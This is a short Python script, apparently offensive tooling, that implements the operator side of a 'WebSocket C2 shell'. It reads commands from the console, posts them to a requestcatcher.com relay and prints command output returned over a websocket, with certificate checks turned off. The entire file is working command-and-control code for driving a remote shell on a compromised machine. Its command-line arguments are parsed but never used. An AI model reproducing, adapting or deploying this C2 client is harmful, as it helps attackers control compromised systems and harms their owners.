#!/usr/bin/python
import requests, logging, websocket, json, sys, argparse, thread, time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# pip install websocket_client
# import _thread as thread


class WebSocketC2(object):
    def __init__(
            self,
            socket_out='wss://pwn-out.requestcatcher.com/init-client',
            socket_in='https://pwn-in.requestcatcher.com/pwn'
    ):
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        self.session = requests.session()
        self.redirect = False
        self.socket_out = socket_out
        self.socket_in = socket_in
        self.ws = websocket.WebSocketApp(
            self.socket_out,
            on_message=self.on_message,
            on_error=self.on_error,
            on_close=self.on_close
        )
        self.ws.keep_running = True
        self.ws.on_open = self.on_open
        self.ws.run_forever()

    def debug(self):
        websocket.enableTrace(True)
        try:
            import http.client as http_client
        except ImportError:
            import httplib as http_client
        http_client.HTTPConnection.debuglevel = 1
        logging.basicConfig()
        logging.getLogger().setLevel(logging.DEBUG)
        requests_log = logging.getLogger("requests.packages.urllib3")
        requests_log.setLevel(logging.DEBUG)
        requests_log.propagate = True
        return self

    def do_post(self, url, data=None, params=None):
        return self.session.post(
            url=url,
            data=data,
            verify=False,
            allow_redirects=self.redirect,
            params=params
        )

    def on_message(self, message):
        try:
            o = json.loads(message.strip())
            print(o['body'])
        except Exception as err:
            error = err

    def on_error(self, error):
        print(error)

    def on_close(self):
        print('[*] closing')

    def on_open(self):
        print('[+] connecting socket in %s socket out %s' % (self.socket_in, self.socket_out))

        def run(*args):
            quit_shell = False
            while not quit_shell:
                sys.stdout.write('# ')
                cmd = str(sys.stdin.readline()).strip()
                if cmd == 'exit':
                    quit_shell = True
                else:
                    self.do_post(url=self.socket_in, data=cmd)
                time.sleep(1)
            time.sleep(1)
            self.ws.close()
            print("[*] thread terminating...")
        thread.start_new_thread(run, ())


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=True, description='WebSocket C2 shell')
    try:
        parser.add_argument('-socketout', default='wss://pwn-out.requestcatcher.com/init-client', action='store', help='Websocket for commands ')
        parser.add_argument('-socketin', default='https://pwn-in.requestcatcher.com/pwn', action='store', help='Websocket for command output')

        if len(sys.argv) == 1:
            parser.print_help()
            sys.exit(1)

        options = parser.parse_args()
        ws = WebSocketC2()
    except Exception as err:
        print(str(err))
